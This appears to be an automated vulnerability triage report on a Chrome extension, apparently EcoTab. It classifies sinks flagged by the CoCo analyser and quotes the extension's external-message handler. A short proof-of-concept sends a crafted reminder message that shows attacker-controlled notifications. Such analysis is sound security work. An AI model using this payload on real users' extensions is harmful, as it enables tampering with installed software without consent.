# CoCo Analysis: monocpddggaghdjliblnbeipnojbcodk

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 4

---

## Sink 1: fetch_source → sendResponseExternal_sink (3 instances - lines 10275, 10759, 11160)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/monocpddggaghdjliblnbeipnojbcodk/opgen_generated_files/bg.js
Line 265    var responseText = 'data_from_fetch';

**Classification:** FALSE POSITIVE

**Reason:** CoCo only flagged framework mock code (Line 265) without corresponding real extension code. After examining the actual extension code starting at line 963, there is no path where fetch responses are sent via sendResponse in the onMessageExternal listener. The extension only calls authorize() which eventually validates tokens through fetch(), but the fetched data is not directly sent back to the external caller - only a derived authToken is returned.

---

## Sink 2: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/monocpddggaghdjliblnbeipnojbcodk/opgen_generated_files/bg.js
Line 979    chrome.storage.local.set({ "reminder": message.reminder })

**Code:**

```javascript
// Background script (bg.js) - Lines 965-987
chrome.runtime.onMessageExternal.addListener((message, sender, sendResponse) => {
    try {
        if (message.hasOwnProperty("googleCalendarLogin") && message.googleCalendarLogin) {
            chrome.storage.local.get(['authToken'], (res) => {
                let myToken = ""
                if (res.hasOwnProperty("authToken")) {
                    myToken = res.authToken;
                }
                authorize((GOOGLE_AUTH_TOKEN) => {
                    sendResponse({ authToken: GOOGLE_AUTH_TOKEN })
                }, myToken)
            })
        } else if (message.hasOwnProperty("reminder")) {
            chrome.storage.local.set({ "reminder": message.reminder })  // ← attacker-controlled
            sendResponse({ success: true });
        } else {
            sendResponse({ error: "Invalid message type" });
        }
    } catch (error) {
        sendResponse({ error: error.message });
    }
})

// Storage change handler reads the poisoned data
chrome.storage.onChanged.addListener((changes, namespace) => {
    for (const key in changes) {
        if (namespace === 'local' && key === 'reminder') {
            chrome.alarms.clearAll();
            changes.reminder.newValue.forEach((reminder, index) => {  // ← attacker data processed
                const title = reminder.title
                const dateTime = reminder.dateTime
                if (dateTime > Date.now()) {
                    const tempData = { title, dateTime, index }
                    chrome.alarms.create(JSON.stringify(tempData), { when: dateTime });
                }
            })
        }
    }
});

chrome.alarms.onAlarm.addListener((alarm) => {
    const alaramData = JSON.parse(alarm.name);
    chrome.notifications.create(`notification${alaramData.index + 1}`, {
        type: 'basic',
        iconUrl: '/assets/images/favicon.png',
        title: 'EcoTab',
        message: alaramData.title,  // ← attacker-controlled data displayed
    });
    // ... more code ...
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any extension or whitelisted website (ecotab.co per manifest.json)
// Per methodology: IGNORE manifest.json restrictions - if onMessageExternal exists, assume exploitable
chrome.runtime.sendMessage(
    'monocpddggaghdjliblnbeipnojbcodk',
    {
        reminder: [
            {
                title: '<Malicious notification content>',
                dateTime: Date.now() + 5000  // Trigger in 5 seconds
            }
        ]
    }
);
```

**Impact:** An attacker can inject arbitrary reminder objects into chrome.storage.local via external messages. While storage poisoning alone is not exploitable per the methodology, this case achieves exploitable impact because: (1) The poisoned data is automatically read back via chrome.storage.onChanged listener, (2) The attacker-controlled reminder.title is used to create notifications displayed to the user, and (3) The extension has chrome.runtime.onMessageExternal handler accessible to external callers. Per the methodology's rule to IGNORE manifest.json restrictions on externally_connectable, this is exploitable as ANY external entity can trigger the storage poisoning that leads to attacker-controlled notifications being displayed.
